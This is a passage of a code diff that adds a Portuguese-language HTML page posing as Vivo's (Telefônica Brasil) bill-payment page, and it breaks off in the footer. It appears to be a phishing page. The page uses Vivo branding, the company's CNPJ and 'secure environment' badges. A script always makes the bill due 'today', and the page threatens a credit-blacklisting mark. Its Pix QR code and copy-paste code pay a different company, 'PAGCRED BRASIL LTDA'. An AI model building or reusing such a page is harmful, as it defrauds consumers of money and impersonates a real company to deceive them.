@@ -1,0 +1,1671 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#660099">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>Vivo — 2ª Via de Fatura</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="js/qrcode.min.js"></script>
+
+    <style>
+        :root {
+            --vivo-purple: #660099;
+            --vivo-purple-dark: #4b0072;
+            --vivo-purple-light: #f5eefb;
+            --vivo-purple-border: #e8d7f2;
+            --vivo-purple-hover: #550080;
+            --vivo-green: #008542;
+            --vivo-green-light: #eaf7ee;
+            --text-title: #111827;
+            --text-body: #374151;
+            --text-muted: #6b7280;
+            --bg-page: #f4f5f8;
+            --bg-card: #ffffff;
+            --border-light: #e5e7eb;
+            --border-subtle: #f0f2f5;
+            --shadow-card: 0 4px 16px rgba(0, 0, 0, 0.04), 0 1px 3px rgba(0, 0, 0, 0.02);
+            --radius-card: 16px;
+            --radius-btn: 10px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-page);
+            color: var(--text-body);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* HEADER INSTITUCIONAL */
+        .site-header {
+            width: 100%;
+            background: #ffffff;
+            border-bottom: 1px solid var(--border-light);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            padding: 14px 20px;
+        }
+
+        .header-wrap {
+            max-width: 540px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+
+        .header-logo {
+            height: 32px;
+            width: auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        .header-pill {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--vivo-purple);
+            background: var(--vivo-purple-light);
+            padding: 3px 8px;
+            border-radius: 4px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--vivo-purple);
+            background: var(--vivo-purple-light);
+            padding: 5px 12px;
+            border-radius: 20px;
+            border: 1px solid var(--vivo-purple-border);
+        }
+
+        .security-badge svg {
+            width: 13px;
+            height: 13px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2.2;
+        }
+
+        /* CONTAINER PRINCIPAL CENTRALIZADO */
+        .main-content {
+            width: 100%;
+            max-width: 540px;
+            margin: 18px auto 36px;
+            padding: 0 16px;
+            flex: 1;
+        }
+
+        /* BREADCRUMB */
+        .breadcrumb-nav {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .breadcrumb-nav a {
+            color: var(--vivo-purple);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .breadcrumb-nav svg {
+            width: 10px;
+            height: 10px;
+            stroke: var(--text-muted);
+            fill: none;
+            stroke-width: 2;
+        }
+
+        /* CARD PRINCIPAL DA FATURA */
+        .bill-card {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            border: 1px solid var(--border-light);
+            box-shadow: var(--shadow-card);
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .bill-header {
+            padding: 20px 22px 18px;
+            border-bottom: 1px solid var(--border-subtle);
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .bill-title {
+            font-size: 19px;
+            font-weight: 800;
+            color: var(--text-title);
+            letter-spacing: -0.4px;
+        }
+
+        .bill-issuer {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 3px;
+        }
+
+        /* STATUS BADGE NO ROXO VIVO */
+        .status-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 5px 12px;
+            border-radius: 14px;
+            background: var(--vivo-purple-light);
+            color: var(--vivo-purple);
+            border: 1px solid var(--vivo-purple-border);
+            white-space: nowrap;
+        }
+
+        .status-pill.paid {
+            background: var(--vivo-green-light);
+            color: var(--vivo-green);
+            border-color: #bbf7d0;
+        }
+
+        .status-indicator {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: currentColor;
+            animation: pulseDot 1.8s infinite;
+        }
+
+        @keyframes pulseDot {
+            0% { opacity: 0.5; transform: scale(0.9); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.5; transform: scale(0.9); }
+        }
+
+        /* VALOR E VENCIMENTO */
+        .bill-amount-box {
+            background: linear-gradient(180deg, #faf7fc 0%, #ffffff 100%);
+            padding: 22px 24px;
+            border-bottom: 1px solid var(--border-subtle);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .amount-label {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .amount-number {
+            font-size: 30px;
+            font-weight: 900;
+            color: var(--vivo-purple);
+            letter-spacing: -0.8px;
+            margin-top: 2px;
+        }
+
+        .due-badge {
+            text-align: right;
+        }
+
+        .due-label {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+        }
+
+        .due-date {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-title);
+            margin-top: 2px;
+        }
+
+        /* METADADOS DA FATURA ALINHADOS: ESQUERDA E TOTALMENTE À DIREITA */
+        .bill-metadata {
+            padding: 18px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: stretch;
+            background: #ffffff;
+            font-size: 13px;
+        }
+
+        .meta-col {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .meta-col.left-col {
+            text-align: left;
+            flex: 1;
+        }
+
+        .meta-col.right-col {
+            text-align: right;
+            align-items: flex-end;
+            flex: 1;
+        }
+
+        .meta-item .meta-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            margin-bottom: 3px;
+        }
+
+        .meta-item .meta-val {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-title);
+            word-break: break-all;
+        }
+
+        .meta-item .meta-val.email-highlight {
+            color: var(--vivo-purple);
+            font-weight: 800;
+        }
+
+        /* SEÇÃO DE PAGAMENTO PIX */
+        .pix-container {
+            padding: 24px;
+            background: #ffffff;
+            border-top: 3px solid var(--vivo-purple);
+        }
+
+        .pix-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .pix-brand-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-title);
+        }
+
+        .pix-custom-icon {
+            width: 28px;
+            height: 28px;
+            object-fit: contain;
+            display: block;
+        }
+
+        /* TAG DE BAIXA IMEDIATA NO ROXO VIVO */
+        .pix-speed-badge {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--vivo-purple);
+            background: var(--vivo-purple-light);
+            padding: 4px 11px;
+            border-radius: 6px;
+            border: 1px solid var(--vivo-purple-border);
+        }
+
+        /* ÁREA DO QR CODE */
+        .qr-card {
+            background: #fafafc;
+            border: 1px solid var(--border-light);
+            border-radius: 12px;
+            padding: 22px;
+            text-align: center;
+            margin-bottom: 22px;
+            position: relative;
+        }
+
+        .qr-viewport {
+            width: 210px;
+            height: 210px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid var(--vivo-purple-border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(102, 0, 153, 0.05);
+        }
+
+        .qr-viewport img, .qr-viewport canvas {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* TIMER NO ROXO VIVO */
+        .qr-timer {
+            margin-top: 14px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .qr-timer svg {
+            width: 15px;
+            height: 15px;
+            stroke: var(--vivo-purple);
+            fill: none;
+            stroke-width: 2.2;
+        }
+
+        .qr-timer strong {
+            color: var(--vivo-purple);
+            font-weight: 800;
+        }
+
+        /* BOTÃO COPIAR CÓDIGO PIX */
+        .btn-copy-pix {
+            width: 100%;
+            background: var(--vivo-purple);
+            color: #ffffff;
+            border: none;
+            border-radius: var(--radius-btn);
+            padding: 16px 20px;
+            font-size: 15px;
+            font-weight: 800;
+            font-family: inherit;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 14px rgba(102, 0, 153, 0.28);
+            margin-bottom: 12px;
+        }
+
+        .btn-copy-pix:hover {
+            background: var(--vivo-purple-hover);
+            transform: translateY(-1px);
+        }
+
+        .btn-copy-pix:active {
+            transform: translateY(0);
+        }
+
+        .btn-copy-pix.success {
+            background: var(--vivo-green);
+            box-shadow: 0 4px 14px rgba(0, 133, 66, 0.3);
+        }
+
+        .btn-copy-pix svg {
+            width: 18px;
+            height: 18px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2.2;
+        }
+
+        /* CAMPO VISÍVEL COM CÓDIGO */
+        .pix-code-field {
+            width: 100%;
+            background: #f9fafb;
+            border: 1px solid var(--border-light);
+            border-radius: 8px;
+            padding: 12px 14px;
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            font-size: 12px;
+            color: #4b5563;
+            outline: none;
+            cursor: pointer;
+            transition: border-color 0.2s;
+            margin-bottom: 20px;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .pix-code-field:focus {
+            border-color: var(--vivo-purple);
+            background: #ffffff;
+        }
+
+        /* ALERTA DE CÓDIGO COPIADO */
+        .copy-toast {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            background: var(--vivo-green-light);
+            border: 1px solid #bbf7d0;
+            color: var(--vivo-green);
+            padding: 11px 14px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .copy-toast svg {
+            width: 16px;
+            height: 16px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2.5;
+            flex-shrink: 0;
+        }
+
+        /* INSTRUÇÕES PASSO A PASSO */
+        .instruction-box {
+            background: #fafafc;
+            border: 1px solid var(--border-light);
+            border-radius: 12px;
+            padding: 18px 20px;
+        }
+
+        .instruction-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-title);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .instruction-title svg {
+            width: 16px;
+            height: 16px;
+            stroke: var(--vivo-purple);
+            fill: none;
+            stroke-width: 2.2;
+        }
+
+        .instruction-steps {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .instruction-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            font-size: 12.5px;
+            color: #4b5563;
+            line-height: 1.45;
+        }
+
+        .step-badge {
+            width: 22px;
+            height: 22px;
+            background: var(--vivo-purple);
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 800;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        /* ========================================================
+           BANNER PAGAMENTO SEGURO VIVO: ROXO TOTAL, ÍCONE BRANCO E TEXTO BRANCO
+        ======================================================== */
+        .info-notice-purple {
+            background: linear-gradient(135deg, var(--vivo-purple) 0%, var(--vivo-purple-dark) 100%);
+            border-radius: var(--radius-card);
+            padding: 20px 24px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            font-size: 13px;
+            color: #ffffff;
+            line-height: 1.55;
+            box-shadow: 0 8px 24px rgba(102, 0, 153, 0.22);
+            margin-bottom: 24px;
+        }
+
+        .info-notice-purple-icon {
+            width: 44px;
+            height: 44px;
+            background: rgba(255, 255, 255, 0.16);
+            border: 1px solid rgba(255, 255, 255, 0.28);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            color: #ffffff;
+        }
+
+        .info-notice-purple-icon svg {
+            width: 24px;
+            height: 24px;
+            stroke: #ffffff;
+            fill: none;
+            stroke-width: 2.2;
+            display: block;
+        }
+
+        .info-notice-purple-title {
+            font-size: 14px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: -0.2px;
+            margin-bottom: 3px;
+            display: block;
+        }
+
+        .info-notice-purple-desc {
+            font-size: 12.5px;
+            color: rgba(255, 255, 255, 0.92);
+        }
+
+        /* TELA DE SUCESSO / QUITAÇÃO */
+        .paid-screen {
+            display: none;
+            padding: 34px 20px;
+            text-align: center;
+        }
+
+        .paid-icon {
+            width: 68px;
+            height: 68px;
+            border-radius: 50%;
+            background: var(--vivo-green-light);
+            color: var(--vivo-green);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .paid-icon svg {
+            width: 34px;
+            height: 34px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2.8;
+        }
+
+        .paid-heading {
+            font-size: 21px;
+            font-weight: 800;
+            color: var(--vivo-green);
+            margin-bottom: 6px;
+        }
+
+        .paid-sub {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 22px;
+        }
+
+        .paid-receipt {
+            background: #f9fafb;
+            border: 1px solid var(--border-light);
+            border-radius: 12px;
+            padding: 18px;
+            text-align: left;
+            font-size: 12.5px;
+        }
+
+        .receipt-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px dashed var(--border-light);
+        }
+
+        .receipt-item:last-child {
+            border-bottom: none;
+            padding-top: 10px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        /* ========================================================
+           RODAPÉ PROFISSIONAL VIVO - 100% CENTRALIZADO E HARMONIOSO
+        ======================================================== */
+        .site-footer {
+            width: 100%;
+            background: #ffffff;
+            border-top: 1px solid var(--border-light);
+            padding: 36px 20px 42px;
+            font-size: 12px;
+            color: #4b5563;
+        }
+
+        .footer-wrap {
+            max-width: 540px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .footer-grid {
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 28px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border-subtle);
+            text-align: left;
+        }
+
+        .footer-col-title {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--vivo-purple);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .footer-col-title svg {
+            width: 15px;
+            height: 15px;
+            stroke: var(--vivo-purple);
+            fill: none;
+            stroke-width: 2.2;
+        }
+
+        .footer-links-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .footer-link-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #4b5563;
+            text-decoration: none;
+            transition: color 0.2s;
+            font-size: 12.5px;
+        }
+
+        .footer-link-item:hover {
+            color: var(--vivo-purple);
+        }
+
+        /* ÍCONES ROXOS INSTITUCIONAIS COM SVG PRECISO */
+        .purple-icon-circle {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: var(--vivo-purple-light);
+            color: var(--vivo-purple);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            border: 1px solid var(--vivo-purple-border);
+        }
+
+        .purple-icon-circle svg {
+            width: 15px;
+            height: 15px;
+            stroke: var(--vivo-purple);
+            fill: none;
+            stroke-width: 2.2;
+            display: block;
+        }
+
+        /* BARRA DE REDES SOCIAIS CENTRALIZADA COM ÍCONES ROXOS */
+        .footer-social-bar {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .footer-social-title {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .social-icons-group {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .social-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--vivo-purple);
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 6px rgba(102, 0, 153, 0.18);
+        }
+
+        .social-btn:hover {
+            background: var(--vivo-purple-hover);
+            transform: translateY(-2px);
+        }
+
+        .social-btn svg {
+            width: 16px;
+            height: 16px;
+            display: block;
+        }
+
+        /* DADOS LEGAIS DA TELEFÔNICA BRASIL CENTRALIZADOS */
+        .footer-legal-text {
+            text-align: center;
+            font-size: 11px;
+            color: #9ca3af;
+            line-height: 1.7;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        /* AJUSTES MOBILE */
+        @media (max-width: 480px) {
+            .site-header {
+                padding: 12px 16px;
+            }
+
+            .main-content {
+                margin-top: 10px;
+                padding: 0 12px;
+            }
+
+            .bill-header {
+                padding: 16px 18px 14px;
+            }
+
+            .bill-amount-box {
+                padding: 18px;
+            }
+
+            .amount-number {
+                font-size: 26px;
+            }
+
+            .bill-metadata {
+                padding: 14px 18px;
+            }
+
+            .pix-container {
+                padding: 18px 16px;
+            }
+
+            .qr-viewport {
+                width: 185px;
+                height: 185px;
+            }
+
+            .info-notice-purple {
+                padding: 16px 18px;
+                gap: 14px;
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+                text-align: left;
+            }
+        }
+        /* ALERTA DE SITUAÇÃO DA CONTA */
+        .account-status-alert {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 13px 24px;
+            background: linear-gradient(90deg, #fef2f2 0%, #fff8f8 100%);
+            border-bottom: 1px solid #fecaca;
+            border-left: 3px solid #dc2626;
+        }
+
+        .account-status-alert svg {
+            width: 18px;
+            height: 18px;
+            stroke: #dc2626;
+            fill: none;
+            stroke-width: 2.2;
+            flex-shrink: 0;
+        }
+
+        .account-status-alert-content {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .account-status-label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #991b1b;
+        }
+
+        .account-status-value {
+            font-size: 11px;
+            font-weight: 800;
+            color: #dc2626;
+            background: #fee2e2;
+            padding: 2px 10px;
+            border-radius: 4px;
+            border: 1px solid #fecaca;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- CABEÇALHO OFICIAL VIVO -->
+    <header class="site-header">
+        <div class="header-wrap">
+            <a href="#" class="header-brand" title="Vivo">
+                <img src="images/vivo-logo.png" alt="Vivo" class="header-logo">
+                <span class="header-pill">2ª Via Fácil</span>
+            </a>
+
+            <div class="security-badge">
+                <svg viewBox="0 0 24 24"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                <span>Ambiente Seguro</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- ÁREA PRINCIPAL -->
+    <main class="main-content">
+
+        <!-- BREADCRUMB -->
+        <nav class="breadcrumb-nav" aria-label="Navegação">
+            <a href="#">Início</a>
+            <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
+            <a href="#">Minhas Faturas</a>
+            <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
+            <span>2ª Via Digital</span>
+        </nav>
+
+        <!-- CARD PRINCIPAL DA FATURA -->
+        <article class="bill-card" aria-label="Detalhes da Fatura Vivo">
+            
+            <!-- TOPO DO CARD -->
+            <div class="bill-header">
+                <div>
+                    <h1 class="bill-title">2ª Via de Fatura</h1>
+                    <div class="bill-issuer">Telefônica Brasil S.A. • CNPJ: 02.558.157/0001-62</div>
+                </div>
+                <div class="status-pill" id="statusBadge">
+                    <span class="status-indicator"></span>
+                    <span id="statusLabel">Aguardando Pagamento</span>
+                </div>
+            </div>
+
+            <!-- VALOR E VENCIMENTO -->
+            <div class="bill-amount-box">
+                <div>
+                    <div class="amount-label">Valor total a pagar</div>
+                    <div class="amount-number">R$ 62,54</div>
+                </div>
+                <div class="due-badge">
+                    <div class="due-label">Vencimento</div>
+                    <div class="due-date" id="dueDateVal"><script>(function(){var d=new Date();var dd=String(d.getDate()).padStart(2,'0');var mm=String(d.getMonth()+1).padStart(2,'0');var yyyy=d.getFullYear();document.write(dd+'/'+mm+'/'+yyyy+' (Hoje)');})();</script></div>
+                </div>
+            </div>
+
+
+            <!-- DADOS DO CLIENTE E CONTA (ALINHADOS: ESQUERDA E TOTALMENTE À DIREITA) -->
+            <div class="bill-metadata">
+                <!-- COLUNA DA ESQUERDA -->
+                <div class="meta-col left-col">
+                    <div class="meta-item">
+                        <div class="meta-label">Situação da conta</div>
+                        <div class="meta-val" style="color: #dc2626; font-weight: 800; display: flex; align-items: center; gap: 6px;">
+                            <svg viewBox="0 0 24 24" width="14" height="14" stroke="#dc2626" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                            Sujeito a negativação
+                        </div>
+                    </div>
+                    <div class="meta-item">
+                        <div class="meta-label">Código da Fatura</div>
+                        <div class="meta-val" id="invoiceCodeVal">0928.4192.018-4</div>
+                    </div>
+                </div>
+
+                <!-- COLUNA DA DIREITA (COLADA NA LATERAL DIREITA) -->
+                <div class="meta-col right-col">
+                    <div class="meta-item">
+                        <div class="meta-label">Mês de Referência</div>
+                        <div class="meta-val" id="refMonthVal">Setembro / 2026</div>
+                    </div>
+                    <div class="meta-item">
+                        <div class="meta-label">Tipo de Cobrança</div>
+                        <div class="meta-val">Fatura Digital</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ÁREA DO PAGAMENTO PIX -->
+            <div class="pix-container" id="pixPaymentArea">
+                
+                <div class="pix-header">
+                    <div class="pix-brand-label">
+                        <!-- ÍCONE DE PIX ENVIADO PELO USUÁRIO -->
+                        <img src="images/pix-icon.png" alt="Pix" class="pix-custom-icon">
+                        <span>Pagar com Pix</span>
+                    </div>
+                    <span class="pix-speed-badge">Baixa Imediata</span>
+                </div>
+
+                <!-- QR CODE -->
+                <div class="qr-card">
+                    <div class="qr-viewport" id="qrViewport">
+                        <img 
+                            id="qrImage" 
+                            src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=0&data=00020101021226830014br.gov.bcb.pix2561qrcode.owem.com.br/v2/qr/cob/36cf1b8884584182b783fd3acd32d4c75204000053039865802BR5919PAGCRED%20BRASIL%20LTDA6009SAO%20PAULO62070503***6304F84B" 
+                            alt="QR Code Pix"
+                        />
+                    </div>
+                    <div class="qr-timer">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <span>Código Pix válido por: <strong id="timerText">29:45</strong></span>
+                    </div>
+                </div>
+
+                <!-- BOTÃO COPIAR -->
+                <button type="button" class="btn-copy-pix" id="btnCopy">
+                    <svg viewBox="0 0 24 24"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                    <span id="btnCopyLabel">Copiar código Pix</span>
+                </button>
+
+                <!-- FEEDBACK COPIADO -->
+                <div class="copy-toast" id="copyToast">
+                    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+                    <span>Código Pix copiado com sucesso! Abra o app do seu banco e cole na opção Pix Copia e Cola.</span>
+                </div>
+
+                <!-- CAMPO INPUT COPIA E COLA -->
+                <input 
+                    type="text" 
+                    class="pix-code-field" 
+                    id="pixCodeField" 
+                    readonly 
+                    value="00020101021226830014br.gov.bcb.pix2561qrcode.owem.com.br/v2/qr/cob/36cf1b8884584182b783fd3acd32d4c75204000053039865802BR5919PAGCRED BRASIL LTDA6009SAO PAULO62070503***6304F84B"
+                    title="Toque para copiar o código"
+                />
+
+                <!-- PASSO A PASSO -->
+                <div class="instruction-box">
+                    <div class="instruction-title">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                        Instruções para pagamento:
+                    </div>
+                    <ol class="instruction-steps">
+                        <li class="instruction-step">
+                            <span class="step-badge">1</span>
+                            <span>Abra o aplicativo do seu banco ou carteira digital de preferência.</span>
+                        </li>
+                        <li class="instruction-step">
+                            <span class="step-badge">2</span>
+                            <span>Escolha a opção <strong>Pix</strong> e selecione <strong>Pix Copia e Cola</strong> (ou aponte a câmera para o QR Code acima).</span>
+                        </li>
+                        <li class="instruction-step">
+                            <span class="step-badge">3</span>
+                            <span>Confirme o valor exato de <strong>R$ 62,54</strong> para a baixa automática imediata no sistema Vivo.</span>
+                        </li>
+                    </ol>
+                </div>
+
+            </div>
+
+            <!-- TELA DE PAGAMENTO CONFIRMADO -->
+            <div class="paid-screen" id="paidScreen">
+                <div class="paid-icon">
+                    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <h2 class="paid-heading">Pagamento Confirmado!</h2>
+                <p class="paid-sub">
+                    Identificamos o pagamento da sua fatura no sistema com sucesso. Sua conta está regularizada.
+                </p>
+
+                <div class="paid-receipt">
+                    <div class="receipt-item">
+                        <span style="color: var(--text-muted);">Comprovante Vivo:</span>
+                        <strong id="receiptId">#TX-928410</strong>
+                    </div>
+                    <div class="receipt-item">
+                        <span style="color: var(--text-muted);">Titular:</span>
+                        <span id="receiptCustomer">-</span>
+                    </div>
+                    <div class="receipt-item">
+                        <span style="color: var(--text-muted);">Data da Quitação:</span>
+                        <span id="receiptTimestamp">Hoje</span>
+                    </div>
+                    <div class="receipt-item">
+                        <span style="color: var(--text-muted);">Forma de Pagamento:</span>
+                        <span style="color: #047857; font-weight: 700;">Pix Banco Central</span>
+                    </div>
+                    <div class="receipt-item">
+                        <span>Valor Quitado:</span>
+                        <span style="color: var(--vivo-purple);">R$ 62,54</span>
+                    </div>
+                </div>
+
+                <div style="margin-top: 22px;">
+                    <button type="button" class="btn-copy-pix" onclick="window.print()" style="max-width: 260px; margin: 0 auto; padding: 13px 20px;">
+                        <svg viewBox="0 0 24 24"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect width="12" height="8" x="6" y="14"/></svg>
+                        <span>Imprimir Comprovante</span>
+                    </button>
+                </div>
+            </div>
+
+        </article>
+
+        <!-- ========================================================
+             BANNER PAGAMENTO SEGURO VIVO: ROXO TOTAL, ÍCONE BRANCO E TEXTO BRANCO
+        ======================================================== -->
+        <div class="info-notice-purple">
+            <div class="info-notice-purple-icon">
+                <!-- ÍCONE CADEADO DE SEGURANÇA BRANCO CLÁSSICO E NÍTIDO -->
+                <svg viewBox="0 0 24 24" width="22" height="22" stroke="#ffffff" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+            <div>
+                <span class="info-notice-purple-title">Pagamento Seguro Vivo</span>
+                <span class="info-notice-purple-desc">
+                    A compensação do Pix é instantânea e integrada diretamente ao sistema da Telefônica Brasil S.A. Em caso de dúvidas sobre a sua fatura, consulte os canais oficiais de atendimento Vivo.
+                </span>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ========================================================
+         RODAPÉ PROFISSIONAL VIVO - 100% CENTRALIZADO E ÍCONES PERFEITOS
+    ======================================================== -->
+    <footer class="site-footer">
+        <div class="footer-wrap">
+            
+            <div class="footer-grid">
+                
+                <!-- COLUNA 1: ATENDIMENTO -->
+                <div>
+                    <div class="footer-col-title">
+                        <!-- Ícone de Atendimento Telefônico -->
